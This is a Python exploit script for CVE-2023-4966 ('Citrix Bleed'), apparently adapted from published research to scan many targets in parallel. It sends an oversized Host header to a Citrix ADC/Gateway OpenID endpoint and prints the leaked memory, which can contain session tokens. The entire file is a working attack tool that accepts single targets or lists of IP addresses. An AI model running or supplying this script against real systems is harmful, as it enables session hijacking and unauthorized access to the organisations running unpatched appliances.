#!/usr/bin/env python3
# This is a simple adaptation of https://www.assetnote.io/resources/research/citrix-bleed-leaking-session-tokens-with-cve-2023-4966 for parallel scan and slightly better error handling

import sys
import requests
import urllib3
import argparse
from concurrent.futures import ThreadPoolExecutor
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def fetch_data(hostname):
    headers = {
        "Host": "a"*24576
    }

    try:
        r = requests.get(f"https://{hostname}/oauth/idp/.well-known/openid-configuration", headers=headers, verify=False, timeout=10)
        r.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
    except requests.exceptions.RequestException as e:
        print(f"Connection error for {hostname}: {e}")
        return None

    if r.status_code == 200:
        print(f"--- Dumped Memory for {hostname} ---")
        print(r.text[131050:])
        print("---      End      ---")
    else:
        print(f"Could not dump memory for {hostname}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', help='The Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)')
    parser.add_argument('--file', help='File containing a list of IP addresses')

    args = parser.parse_args()

    if args.file:
        with open(args.file, 'r') as file:
            ip_addresses = [line.strip() for line in file]

        with ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(fetch_data, ip_addresses)
    elif args.target:
        hostname = args.target
        fetch_data(hostname)
    else:
        print('Either --target or --file must be provided')
        sys.exit(1)

if __name__ == "__main__":
    main()
